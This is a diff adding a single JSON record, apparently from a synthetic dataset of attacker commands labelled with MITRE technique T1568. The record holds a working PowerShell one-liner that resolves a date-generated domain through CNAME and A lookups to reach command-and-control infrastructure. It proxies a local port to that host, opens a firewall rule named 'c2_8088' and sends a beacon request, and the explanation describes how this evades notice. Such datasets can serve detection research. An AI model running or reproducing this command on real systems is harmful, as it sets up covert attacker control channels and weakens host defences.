@@ -1,0 +1,21 @@
+{
+  "technique_id": "T1568",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "$seed='hub';$d=$seed+(Get-Date -Format 'ddMMyy')+'.io';try{$c=Resolve-DnsName $d -Type CNAME -ErrorAction Stop|Select-Object -First 1;$alias=$c.CName.TrimEnd('.');$a=Resolve-DnsName $alias -Type A -ErrorAction Stop;$ip=($a|Get-Random).IPAddress;netsh interface portproxy add v4tov4 listenaddress=127.0.0.1 listenport=8088 connectaddress=$ip connectport=80;netsh advfirewall firewall add rule name='c2_8088' dir=in action=allow protocol=TCP localport=8088;Invoke-WebRequest -Uri 'http://127.0.0.1:8088/p' -UseBasicParsing -Headers @{CN=$alias;D=$d} -TimeoutSec 5}catch{}",
+  "explanation": "Exploits CNAME indirection for dynamic resolution, chaining to the current active A record, and then proxies local traffic to blend with normal HTTP on an alternative port.",
+  "rationale_steps": [
+    "Resolve CNAME to follow dynamic aliasing to the active infrastructure.",
+    "Map local alternate port to the dynamic A record and initiate communication."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1568-0a23acf2-b0eb9078",
+  "source_prompt_hash": "0a23acf2",
+  "timestamp_utc": "2025-09-30T09:39:46.357850Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
